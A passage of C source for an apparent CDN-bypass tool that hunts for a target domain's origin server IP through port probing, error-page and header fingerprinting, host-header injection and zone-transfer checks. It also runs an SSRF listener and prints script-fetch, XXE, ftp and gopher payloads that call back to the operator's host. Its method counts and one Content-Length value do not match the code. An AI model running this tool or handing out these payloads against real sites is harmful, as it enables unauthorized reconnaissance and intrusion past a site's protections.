    printf("    \033[1;37mFound \033[1;33m%d\033[1;37m open non-web services\033[0m\n", open_ports);
    
    if (open_ports > 0) {
        // Remove trailing comma
        if (strlen(port_list) > 0) port_list[strlen(port_list) - 1] = '\0';
        
        for (int i = 0; i < candidate_count; i++) {
            if (strcmp(candidates[i].ip, ip) == 0) {
                strncpy(candidates[i].alt_ports_open, port_list, 
                       sizeof(candidates[i].alt_ports_open) - 1);
                candidates[i].service_correlation_score = open_ports * 10;
                candidates[i].confidence = fmin(100, candidates[i].confidence + 
                                               (open_ports > 2 ? 15 : 10));
                break;
            }
        }
        
        char info[256];
        snprintf(info, sizeof(info), "Open services: %s", port_list);
        log_result_extended("CROSS_PROTOCOL", ip, "Service Correlation", 
                          70 + (open_ports * 5), NULL, NULL, info);
    }
}

void alternative_services_probing(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("ALTERNATIVE SERVICES PROBING");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    
    int responsive_ports = 0;
    char port_list[256] = {0};
    
    for (int i = 0; i < ALTERNATIVE_PORT_COUNT; i++) {
        char url[256];
        snprintf(url, sizeof(url), "http://%s:%d", ip, ALTERNATIVE_PORTS[i]);
        
        HttpResponse res = {0};
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, host_header);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
        curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request
        
        if (curl_easy_perform(curl) == CURLE_OK) {
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            
            if (response_code == 200 || response_code == 301 || response_code == 302) {
                printf("      \033[1;32m[+] Port \033[1;33m%d\033[1;32m responds to HTTP requests\033[0m\n", ALTERNATIVE_PORTS[i]);
                responsive_ports++;
                
                // Add to port list
                char port_str[16];
                snprintf(port_str, sizeof(port_str), "%d,", ALTERNATIVE_PORTS[i]);
                strncat(port_list, port_str, sizeof(port_list) - strlen(port_list) - 1);
            }
        }
        
        curl_slist_free_all(headers);
        if (res.data) free(res.data);
    }
    
    curl_easy_cleanup(curl);
    
    printf("    \033[1;37mFound \033[1;33m%d\033[1;37m responsive alternative ports\033[0m\n", responsive_ports);
    
    if (responsive_ports > 0) {
        // Remove trailing comma
        if (strlen(port_list) > 0) port_list[strlen(port_list) - 1] = '\0';
        
        for (int i = 0; i < candidate_count; i++) {
            if (strcmp(candidates[i].ip, ip) == 0) {
                // Update the alt_ports_open field
                if (strlen(candidates[i].alt_ports_open) > 0) {
                    strncat(candidates[i].alt_ports_open, ",", 
                           sizeof(candidates[i].alt_ports_open) - strlen(candidates[i].alt_ports_open) - 1);
                }
                strncat(candidates[i].alt_ports_open, port_list,
                       sizeof(candidates[i].alt_ports_open) - strlen(candidates[i].alt_ports_open) - 1);
                candidates[i].confidence = fmin(100, candidates[i].confidence + 
                                               (responsive_ports * 5));
                break;
            }
        }
        
        char info[256];
        snprintf(info, sizeof(info), "Alternative HTTP ports: %s", port_list);
        log_result_extended("ALTERNATIVE_PORTS", ip, "Alternative Services", 
                          65 + (responsive_ports * 5), NULL, NULL, info);
    }
}

void generate_random_test_path(char *buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    
    if (size < RANDOM_TEST_PATH_LEN + 1) return;
    
    // Start with the base path
    strcpy(buffer, ERROR_TEST_PATH);
    
    // Add random characters
    for (int i = strlen(ERROR_TEST_PATH); i < RANDOM_TEST_PATH_LEN; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        buffer[i] = charset[key];
    }
    buffer[RANDOM_TEST_PATH_LEN] = '\0';
}

char* fetch_error_page_hash(const char *url, const char *host_header) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    
    HttpResponse res = {0};
    struct curl_slist *headers = NULL;
    if (host_header) {
        headers = curl_slist_append(headers, host_header);
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    if (headers) curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    
    char *hash = NULL;
    
    if (curl_easy_perform(curl) == CURLE_OK && res.data) {
        long response_code;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        
        // We're looking for error pages (404, 403, etc.)
        if (response_code == 404 || response_code == 403 || response_code == 500) {
            hash = malloc(65);
            if (hash) {
                compute_sha256((const unsigned char*)res.data, res.size, hash);
            }
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
    
    return hash;
}

void error_page_fingerprint_validation(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("ERROR PAGE FINGERPRINT VALIDATION");
    
    // Generate a random test path
    char random_path[64];
    generate_random_test_path(random_path, sizeof(random_path));
    
    // First, get error page from domain
    if (!domain_error_hash[0]) {
        printf("    \033[1;37mFetching error page from domain...\033[0m\n");
        
        char domain_url[256];
        snprintf(domain_url, sizeof(domain_url), "https://%s%s", domain, random_path);
        
        char *hash = fetch_error_page_hash(domain_url, NULL);
        if (hash) {
            strncpy(domain_error_hash, hash, 64);
            domain_error_hash[64] = '\0';
            printf("    \033[1;37mDomain error page hash: \033[1;33m%s\033[0m\n", hash);
            free(hash);
        } else {
            print_error("Could not fetch domain error page");
            return;
        }
    }
    
    // Now test the IP
    printf("    \033[1;37mTesting IP \033[1;33m%s\033[0m\n", ip);
    
    char ip_url[256];
    snprintf(ip_url, sizeof(ip_url), "http://%s%s", ip, random_path);
    
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    
    char *ip_hash = fetch_error_page_hash(ip_url, host_header);
    
    if (ip_hash) {
        printf("    \033[1;37mIP error page hash: \033[1;33m%s\033[0m\n", ip_hash);
        
        // Compare hashes
        if (strcmp(domain_error_hash, ip_hash) == 0) {
            printf("    \033[1;32m🔥 ERROR PAGE MATCH!\033[0m\n");
            printf("      \033[1;37mIP returns identical error page to domain\033[0m\n");
            
            for (int i = 0; i < candidate_count; i++) {
                if (strcmp(candidates[i].ip, ip) == 0) {
                    candidates[i].error_page_match = 1;
                    candidates[i].confidence = fmin(100, candidates[i].confidence + 20);
                    break;
                }
            }
            
            log_result_extended("ERROR_PAGE_MATCH", ip, "Error Page Fingerprint", 95, 
                              NULL, NULL, "Identical error page to domain");
        } else {
            printf("    \033[1;31m✗ Error pages don't match\033[0m\n");
            printf("      \033[1;37mThis suggests IP might not be the origin\033[0m\n");
            
            for (int i = 0; i < candidate_count; i++) {
                if (strcmp(candidates[i].ip, ip) == 0) {
                    candidates[i].error_page_match = 2;
                    candidates[i].confidence = fmax(0, candidates[i].confidence - 10);
                    break;
                }
            }
        }
        
        free(ip_hash);
    } else {
        print_error("Could not fetch error page from IP");
    }
}

size_t header_callback(char *buffer, size_t size, size_t nitems, void *userdata) {
    size_t total_size = size * nitems;
    HttpResponse *res = (HttpResponse *)userdata;
    
    // Check if our custom header is present in response
    char *header = strstr(buffer, CUSTOM_HEADER_NAME ":");
    if (header) {
        // Check if the header name is normalized
        char normalized[64];
        snprintf(normalized, sizeof(normalized), "X-My-Header-Test:");
        
        if (strncmp(header, normalized, strlen(normalized)) == 0) {
            // Header was normalized
            res->size = 1; // Use size field to indicate normalized
        } else {
            // Header was preserved as sent
            res->size = 2; // Use size field to indicate preserved
        }
    }
    
    return total_size;
}

void header_normalization_check(const char *ip, const char *domain) {
    if (!is_valid_ip(ip) || !sanitize_input(domain)) return;
    
    print_method_header("HEADER NORMALIZATION CHECK");
    
    CURL *curl = curl_easy_init();
    if (!curl) return;
    
    char url[256];
    snprintf(url, sizeof(url), "http://%s", ip);
    
    HttpResponse res = {0};
    struct curl_slist *headers = NULL;
    
    // Add custom header with mixed case
    char custom_header[256];
    snprintf(custom_header, sizeof(custom_header), "%s: %s", 
             CUSTOM_HEADER_NAME, CUSTOM_HEADER_VALUE);
    headers = curl_slist_append(headers, custom_header);
    
    // Add Host header
    char host_header[256];
    snprintf(host_header, sizeof(host_header), "Host: %s", domain);
    headers = curl_slist_append(headers, host_header);
    
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_callback);
    curl_easy_setopt(curl, CURLOPT_HEADERDATA, &res);
    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request
    
    if (curl_easy_perform(curl) == CURLE_OK) {
        if (res.size == 1) {
            printf("    \033[1;33m⚠ HEADER NORMALIZATION DETECTED\033[0m\n");
            printf("      \033[1;37mProxy/CDN normalized '\033[1;36m%s\033[1;37m' to '\033[1;36mX-My-Header-Test\033[1;37m'\033[0m\n", CUSTOM_HEADER_NAME);
            printf("      \033[1;37mThis suggests the IP is behind a proxy\033[0m\n");
            
            for (int i = 0; i < candidate_count; i++) {
                if (strcmp(candidates[i].ip, ip) == 0) {
                    candidates[i].header_normalization_check = 1;
                    candidates[i].confidence = fmax(0, candidates[i].confidence - 15);
                    break;
                }
            }
        } else if (res.size == 2) {
            printf("    \033[1;32m🔥 HEADER PRESERVATION DETECTED\033[0m\n");
            printf("      \033[1;37mServer preserved '\033[1;36m%s\033[1;37m' exactly as sent\033[0m\n", CUSTOM_HEADER_NAME);
            printf("      \033[1;37mThis suggests direct access to origin server\033[0m\n");
            
            for (int i = 0; i < candidate_count; i++) {
                if (strcmp(candidates[i].ip, ip) == 0) {
                    candidates[i].header_normalization_check = 2;
                    candidates[i].confidence = fmin(100, candidates[i].confidence + 15);
                    break;
                }
            }
            
            log_result_extended("HEADER_PRESERVED", ip, "Header Normalization", 85, 
                              NULL, NULL, "Preserves custom header case");
        } else {
            printf("    \033[1;31m✗ Could not determine header normalization\033[0m\n");
            printf("      \033[1;37mCustom header not echoed in response\033[0m\n");
        }
    }
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    if (res.data) free(res.data);
}

// ================================================================
// SSRF AND REPORT FUNCTIONS
// ================================================================

void *ssrf_listener_thread(void *arg) {
    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[1024] = {0};
    
    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        return NULL;
    }
    
    // Set socket options
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        close(server_fd);
        return NULL;
    }
    
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(SSRF_LISTENER_PORT);
    
    // Bind socket
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        close(server_fd);
        return NULL;
    }
    
    // Listen
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        close(server_fd);
        return NULL;
    }
    
    print_success("SSRF listener started");
    
    while (1) {
        // Accept connection
        if ((client_fd = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            continue;
        }
        
        // Get client IP
        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &address.sin_addr, client_ip, INET_ADDRSTRLEN);
        
        // Read request
        read(client_fd, buffer, 1024);
        
        printf("\n\033[1;32m🔥 SSRF PINGBACK RECEIVED!\033[0m\n");
        printf("    \033[1;37mFrom IP: \033[1;33m%s\033[0m\n", client_ip);
        printf("    \033[1;37mRequest:\n\033[1;36m%s\033[0m\n", buffer);
        
        // Send response
        const char *response = 
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/plain\r\n"
            "Content-Length: 21\r\n"
            "\r\n"
            "SSRF Pingback Received";
        
        send(client_fd, response, strlen(response), 0);
        
        // Check if this IP is already in candidates
        int found = 0;
        for (int i = 0; i < candidate_count; i++) {
            if (strcmp(candidates[i].ip, client_ip) == 0) {
                found = 1;
                candidates[i].confidence = 100; // SSRF pingback is definitive proof
                strncpy(candidates[i].method, "SSRF Pingback", 63);
                candidates[i].method[63] = 0;
                break;
            }
        }
        
        if (!found && candidate_count < 100) {
            strncpy(candidates[candidate_count].ip, client_ip, INET6_ADDRSTRLEN - 1);
            candidates[candidate_count].ip[INET6_ADDRSTRLEN - 1] = 0;
            candidates[candidate_count].confidence = 100;
            strncpy(candidates[candidate_count].method, "SSRF Pingback", 63);
            candidates[candidate_count].method[63] = 0;
            candidate_count++;
        }
        
        // Log the pingback
        pthread_mutex_lock(&log_mutex);
        FILE *f = fopen(LOG_FILE, "a");
        if (f) {
            time_t now = time(NULL);
            char *timestamp = ctime(&now);
            timestamp[strlen(timestamp)-1] = '\0';
            fprintf(f, "[%s] SSRF PINGBACK | IP: %s | Method: SSRF\n", 
                    timestamp, client_ip);
            fclose(f);
        }
        pthread_mutex_unlock(&log_mutex);
        
        close(client_fd);
        
        // Clear buffer
        memset(buffer, 0, sizeof(buffer));
    }
    
    close(server_fd);
    return NULL;
}

void start_ssrf_listener() {
    pthread_t thread;
    if (pthread_create(&thread, NULL, ssrf_listener_thread, NULL) == 0) {
        pthread_detach(thread);
        
        // Get local IP for SSRF instructions
        struct ifaddrs *ifaddr, *ifa;
        if (getifaddrs(&ifaddr) == -1) {
            strcpy(ssrf_server_ip, "YOUR_IP_HERE");
            return;
        }
        
        // Find the first non-loopback IPv4 address
        for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr == NULL) continue;
            
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in *sa = (struct sockaddr_in *)ifa->ifa_addr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);
                
                // Skip loopback
                if (strcmp(ip, "127.0.0.1") != 0) {
                    strncpy(ssrf_server_ip, ip, INET_ADDRSTRLEN - 1);
                    ssrf_server_ip[INET_ADDRSTRLEN - 1] = '\0';
                    break;
                }
            }
        }
        
        freeifaddrs(ifaddr);
        
        if (strlen(ssrf_server_ip) == 0) {
            strcpy(ssrf_server_ip, "YOUR_IP_HERE");
        }
    }
}

void print_ssrf_instructions(const char *domain) {
    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║                    SSRF PINGBACK INSTRUCTIONS                    ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════════╝\033[0m\n");
    printf("\n    \033[1;37mListening for SSRF pingbacks on: \033[1;33mhttp://%s:%d\033[0m\n", 
           ssrf_server_ip, SSRF_LISTENER_PORT);
    printf("    \033[1;37mTest these payloads in SSRF vulnerabilities:\033[0m\n\n");
    
    printf("    \033[1;36m1. Basic pingback:\033[0m\n");
    printf("       \033[1;33mhttp://%s:%d/\033[0m\n\n", ssrf_server_ip, SSRF_LISTENER_PORT);
    
    printf("    \033[1;36m2. With User-Agent (more stealth):\033[0m\n");
    printf("       \033[1;33m<script>fetch('http://%s:%d/',{headers:{'User-Agent':'Mozilla'}})</script>\033[0m\n\n", 
           ssrf_server_ip, SSRF_LISTENER_PORT);
    
    printf("    \033[1;36m3. In XML (XXE):\033[0m\n");
    printf("       \033[1;33m<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY %% remote SYSTEM \"http://%s:%d/\">%%remote;]>\033[0m\n\n", 
           ssrf_server_ip, SSRF_LISTENER_PORT);
    
    printf("    \033[1;36m4. In DNS/other protocols:\033[0m\n");
    printf("       \033[1;33mftp://%s:%d/test\033[0m\n", ssrf_server_ip, SSRF_LISTENER_PORT);
    printf("       \033[1;33mgopher://%s:%d/_test\033[0m\n\n", ssrf_server_ip, SSRF_LISTENER_PORT);
    
    printf("    \033[1;32m[+] Any pingback will be logged with 100%% confidence!\033[0m\n");
    printf("\033[1;35m══════════════════════════════════════════════════════════════════\033[0m\n\n");
}

void generate_report() {
    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║                         FINAL RESULTS REPORT                     ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════════╝\033[0m\n");
    
    if (candidate_count == 0) {
        printf("\n    \033[1;31m✗ No origin IP candidates found.\033[0m\n");
        printf("    \033[1;37mTry running with --aggressive flag or check if domain uses perfect CDN.\033[0m\n");
        return;
    }
    
    // Sort candidates by confidence (bubble sort)
    for (int i = 0; i < candidate_count - 1; i++) {
        for (int j = 0; j < candidate_count - i - 1; j++) {
            if (candidates[j].confidence < candidates[j + 1].confidence) {
                OriginCandidate temp = candidates[j];
                candidates[j] = candidates[j + 1];
                candidates[j + 1] = temp;
            }
        }
    }
    
    printf("\n    \033[1;37mFound \033[1;33m%d\033[1;37m potential origin IPs:\033[0m\n\n", candidate_count);
    
    for (int i = 0; i < candidate_count; i++) {
        if (candidates[i].confidence >= 60) {
            printf("    \033[1;35m[%d]\033[0m \033[1;32m%s\033[0m\n", i + 1, candidates[i].ip);
            printf("        \033[1;37mConfidence: \033[1;33m%d%%\033[0m\n", candidates[i].confidence);
            printf("        \033[1;37mMethod: \033[1;36m%s\033[0m\n", candidates[i].method);
            
            if (strlen(candidates[i].server_banner) > 0) {
                printf("        \033[1;37mBanner: \033[1;36m%s\033[0m\n", candidates[i].server_banner);
            }
            
            if (strlen(candidates[i].organization) > 0) {
                printf("        \033[1;37mOrganization: \033[1;36m%s\033[0m\n", candidates[i].organization);
            }
            
            if (strlen(candidates[i].additional_info) > 0) {
                printf("        \033[1;37mInfo: \033[1;33m%s\033[0m\n", candidates[i].additional_info);
            }
            
            if (candidates[i].fuzzy_html_match > 0) {
                printf("        \033[1;37mFuzzy HTML match: \033[1;33m%d%%\033[0m\n", candidates[i].fuzzy_html_match);
            }
            
            if (strlen(candidates[i].alt_ports_open) > 0) {
                printf("        \033[1;37mOpen ports: \033[1;33m%s\033[0m\n", candidates[i].alt_ports_open);
            }
            
            if (candidates[i].sni_default_misconfig) {
                printf("        \033[1;32m[+] SNI Default Misconfiguration\033[0m\n");
            }
            
            if (candidates[i].error_page_match == 1) {
                printf("        \033[1;32m✓ Error page matches domain\033[0m\n");
            }
            
            if (candidates[i].header_normalization_check == 2) {
                printf("        \033[1;32m✓ Header preservation (likely origin)\033[0m\n");
            } else if (candidates[i].header_normalization_check == 1) {
                printf("        \033[1;33m⚠ Header normalization (likely proxy)\033[0m\n");
            }
            
            printf("\n");
        }
    }
    
    // Write comprehensive report to file
    FILE *report = fopen("origin_report.txt", "w");
    if (report) {
        fprintf(report, "=================================================\n");
        fprintf(report, "      ORIGIN IP DISCOVERY REPORT                \n");
        fprintf(report, "=================================================\n");
        fprintf(report, "Target: %s\n", target_domain);
        fprintf(report, "Time: %s", ctime(&(time_t){time(NULL)}));
        fprintf(report, "Total candidates: %d\n\n", candidate_count);
        
        for (int i = 0; i < candidate_count; i++) {
            if (candidates[i].confidence >= 50) {
                fprintf(report, "CANDIDATE %d:\n", i + 1);
                fprintf(report, "  IP: %s\n", candidates[i].ip);
                fprintf(report, "  Confidence: %d%%\n", candidates[i].confidence);
                fprintf(report, "  Discovery Method: %s\n", candidates[i].method);
                fprintf(report, "  Server Banner: %s\n", candidates[i].server_banner);
                fprintf(report, "  Organization: %s\n", candidates[i].organization);
                fprintf(report, "  Additional Info: %s\n", candidates[i].additional_info);
                
                if (candidates[i].fuzzy_html_match > 0) {
                    fprintf(report, "  Fuzzy HTML Match: %d%%\n", candidates[i].fuzzy_html_match);
                }
                
                if (strlen(candidates[i].alt_ports_open) > 0) {
                    fprintf(report, "  Open Ports: %s\n", candidates[i].alt_ports_open);
                }
                
                fprintf(report, "  Validation Flags:\n");
                fprintf(report, "    - SNI Misconfig: %s\n", 
                        candidates[i].sni_default_misconfig ? "YES" : "NO");
                fprintf(report, "    - Error Page Match: %s\n",
                        candidates[i].error_page_match == 1 ? "YES" : 
                        (candidates[i].error_page_match == 2 ? "NO" : "UNKNOWN"));
                fprintf(report, "    - Header Normalization: %s\n",
                        candidates[i].header_normalization_check == 2 ? "PRESERVED (ORIGIN)" :
                        (candidates[i].header_normalization_check == 1 ? "NORMALIZED (PROXY)" : "UNKNOWN"));
                
                fprintf(report, "\n");
            }
        }
        
        fprintf(report, "=================================================\n");
        fprintf(report, "RECOMMENDATIONS:\n");
        
        if (candidate_count > 0 && candidates[0].confidence >= 80) {
            fprintf(report, "1. PRIMARY TARGET: %s (Confidence: %d%%)\n", 
                    candidates[0].ip, candidates[0].confidence);
            fprintf(report, "   - Test with: curl -H \"Host: %s\" http://%s/\n",
                    target_domain, candidates[0].ip);
            
            if (strlen(candidates[0].alt_ports_open) > 0) {
                fprintf(report, "   - Also check alternative ports: %s\n",
                        candidates[0].alt_ports_open);
            }
        }
        
        fprintf(report, "\n2. VERIFICATION STEPS:\n");
        fprintf(report, "   - Check if IP responds without Host header\n");
        fprintf(report, "   - Test SSL certificate on port 443\n");
        fprintf(report, "   - Verify WHOIS information matches expected org\n");
        fprintf(report, "   - Compare HTTP responses with CDN-fronted site\n");
        
        fclose(report);
        printf("    \033[1;37mDetailed report written to: \033[1;36morigin_report.txt\033[0m\n");
    }
}

// ================================================================
// MAIN FUNCTION
// ================================================================

int main(int argc, char *argv[]) {
    srand(time(NULL));
    
    if (argc < 2) {
        print_banner();
        printf("\n    \033[1;37mUsage: \033[1;33m%s <target.com>\033[0m \033[1;37m[--deep] [--aggressive] [--no-stealth] [--debug]\033[0m\n\n", argv[0]);
        printf("    \033[1;36mOPTIONS:\033[0m\n");
        printf("      \033[1;37m--deep         \033[1;33mEnable deep scanning\033[0m\n");
        printf("      \033[1;37m--aggressive   \033[1;33mEnable aggressive mode\033[0m\n");
        printf("      \033[1;37m--no-stealth   \033[1;33mDisable stealth mode\033[0m\n");
        printf("      \033[1;37m--debug        \033[1;33mEnable debug output\033[0m\n\n");
        printf("    \033[1;36m30 METHODS IMPLEMENTED - ALL NATIVE\033[0m\n");
        return 1;
    }

    strncpy(target_domain, argv[1], 255);
    target_domain[255] = 0;
    
    if (!sanitize_input(target_domain)) {
        printf("\n    \033[1;31m✗ Invalid domain input.\033[0m\n");
        return 1;
    }
    
    int deep_mode = 0;
    
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--deep") == 0) deep_mode = 1;
        if (strcmp(argv[i], "--aggressive") == 0) aggressive_mode = 1;
        if (strcmp(argv[i], "--no-stealth") == 0) stealth_mode = 0;
        if (strcmp(argv[i], "--debug") == 0) debug_mode = 1;
    }

    print_banner();
    
    printf("    \033[1;37mTarget: \033[1;33m%s\033[0m\n", target_domain);
    printf("    \033[1;37mMode: \033[1;36m%s\033[0m\n", 
           aggressive_mode ? "AGGRESSIVE" : (stealth_mode ? "STEALTH" : "NORMAL"));
    printf("\033[1;35m══════════════════════════════════════════════════════════════════\033[0m\n");
    
    if (stealth_mode && !aggressive_mode) {
        printf("    \033[1;36m🕵️  STEALTH MODE: ON\033[0m\n");
    } else if (aggressive_mode) {
        printf("    \033[1;31m[+] AGGRESSIVE MODE: ON\033[0m\n");
    } else {
        printf("    \033[1;33m[+] STEALTH MODE: OFF\033[0m\n");
    }

    start_ssrf_listener();
    sleep(1);
    print_ssrf_instructions(target_domain);

    // Initialize log file
    FILE *f = fopen(LOG_FILE, "w");
    if (f) {
        time_t now = time(NULL);
        fprintf(f, "=================================================\n");
        fprintf(f, "      ORIGIN DISCOVERY LOG                      \n");
        fprintf(f, "=================================================\n");
        fprintf(f, "   Target: %-30s \n", target_domain);
        fprintf(f, "   Time: %-30s \n", ctime(&now));
        fprintf(f, "   Mode: %s\n", aggressive_mode ? "AGGRESSIVE" : (stealth_mode ? "STEALTH" : "NORMAL"));
        fprintf(f, "   SSRF Listener: http://%s:%d\n", ssrf_server_ip, SSRF_LISTENER_PORT);
        fprintf(f, "=================================================\n\n");
        fclose(f);
    }
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    print_phase_header("PHASE 1: ORIGINAL METHODS");
    
    // Run the first 20 methods
    cname_recursion(target_domain);
    check_dns_records(target_domain);
    ssl_certificate_scan_native(target_domain);
    ssl_serial_number_search_native(target_domain);
    check_ipv6_leak(target_domain);
    try_zone_transfer_native(target_domain);
    
    if (deep_mode || aggressive_mode) {
        dns_bruteforce(target_domain);
    }
    
    check_mx_records(target_domain);
    check_historical_dns_native(target_domain);
    check_crt_sh_native(target_domain);
    check_http_redirects(target_domain);
    check_x_headers(target_domain);
    check_robots_txt(target_domain);
    check_sitemap_xml(target_domain);
    check_crossdomain_xml(target_domain);
    check_host_header_injection(target_domain);
    check_public_ip(target_domain);
    check_cdn_detection(target_domain);

    print_phase_header("PHASE 2: ADVANCED MODULES");
    
    // Run advanced modules on top candidates
    if (candidate_count > 0) {
        printf("    \033[1;37mRunning advanced modules on discovered IPs...\033[0m\n");
        
        int limit = (candidate_count > 3) ? 3 : candidate_count;
        for (int i = 0; i < limit; i++) {
            if (candidates[i].confidence >= 60) {
                printf("\n    \033[1;35m[+] Advanced analysis for: \033[1;33m%s\033[0m\n", candidates[i].ip);
                
                banner_grab_and_verify(candidates[i].ip, target_domain);
                whois_correlation_native(candidates[i].ip, target_domain);
                subnet_neighbor_scan(candidates[i].ip, target_domain);
                favicon_fingerprint_scan(candidates[i].ip, target_domain);
                absolute_url_bypass_test(target_domain, candidates[i].ip);
                mtls_probe_native(candidates[i].ip);
                sni_default_probe(candidates[i].ip, target_domain);
            }
        }
    }

    print_phase_header("PHASE 3: VALIDATION METHODS");
    
    if (candidate_count > 0) {
        int validation_limit = (candidate_count > 3) ? 3 : candidate_count;
        
        for (int i = 0; i < validation_limit; i++) {
            if (candidates[i].confidence >= 70) {
                printf("\n    \033[1;35m[+] MATHEMATICAL VALIDATION for: \033[1;33m%s\033[0m\n", 
                       candidates[i].ip);
                
                // Run validation methods
                html_fuzzy_hashing_validation(candidates[i].ip, target_domain);
                proxy_penalty_timing_attack(candidates[i].ip, target_domain);
                cross_protocol_service_correlation(candidates[i].ip, target_domain);
                alternative_services_probing(candidates[i].ip, target_domain);
                error_page_fingerprint_validation(candidates[i].ip, target_domain);
                header_normalization_check(candidates[i].ip, target_domain);
            }
        }
    } else {
        printf("    \033[1;33m[-] No candidates for validation\n");
    }

    printf("\n    \033[1;35m⏳ Processing results...\033[0m\n");
    printf("    \033[1;33m[*] Waiting for SSRF pingbacks...\033[0m\n");
    sleep(10);
    
    curl_global_cleanup();
    EVP_cleanup();
    
    // Clean up fingerprint data
    if (domain_fingerprint.title) free(domain_fingerprint.title);
    if (domain_fingerprint.body_hash) free(domain_fingerprint.body_hash);
    if (domain_fingerprint.error_page_hash) free(domain_fingerprint.error_page_hash);
    if (domain_fingerprint.structural_hash) free(domain_fingerprint.structural_hash);
    if (domain_fingerprint.fuzzy_hash) free(domain_fingerprint.fuzzy_hash);
    if (domain_fingerprint.tags_only) free(domain_fingerprint.tags_only);
    
    generate_report();
    
    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║                          SCAN COMPLETE                           ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════════╝\033[0m\n");
    printf("\n    \033[1;32m✓ ALL 30 NATIVE METHODS EXECUTED SUCCESSFULLY!\033[0m\n");
    printf("    \033[1;37m• 20 Original Discovery Methods\033[0m\n");
    printf("    \033[1;37m• 4 Advanced Modules\033[0m\n");
    printf("    \033[1;37m• 6 Mathematical Validation Methods\033[0m\n");
    printf("\n    \033[1;36mLog file: \033[1;33m%s\033[0m\n", LOG_FILE);
    
    if (candidate_count == 0) {
        printf("\n    \033[1;33m⚠ No origin IPs found. Try:\033[0m\n");
        printf("    \033[1;37m1. %s %s --aggressive\033[0m\n", argv[0], target_domain);
        printf("    \033[1;37m2. Target may have perfect CDN protection\033[0m\n");
    }
    
    return 0;
}